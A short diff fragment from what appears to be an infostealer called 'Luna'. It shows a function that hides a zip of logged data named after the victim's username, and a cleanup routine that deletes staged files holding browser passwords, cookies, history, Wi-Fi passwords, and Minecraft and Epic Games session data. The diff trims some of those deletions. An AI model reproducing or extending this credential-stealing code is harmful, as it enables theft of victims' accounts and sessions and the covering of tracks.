@@ -472,10 +472,7 @@ def zipup():
     hide(f'Luna-Logged-{os.getenv("Username")}.zip')
 
 def cleanup():
-    for clean in [os.remove("google-passwords.txt"),
-                  os.remove("google-cookies.txt"),
-                  os.remove("google-history.txt"),
-                  os.remove("wifi-passwords.txt"),
+    for clean in [os.remove("wifi-passwords.txt"),
                   os.remove("minecraft-usercache.json"),
                   os.remove("minecraft-sessioninfo.json"),
                   os.remove("epicgames-data.txt"),
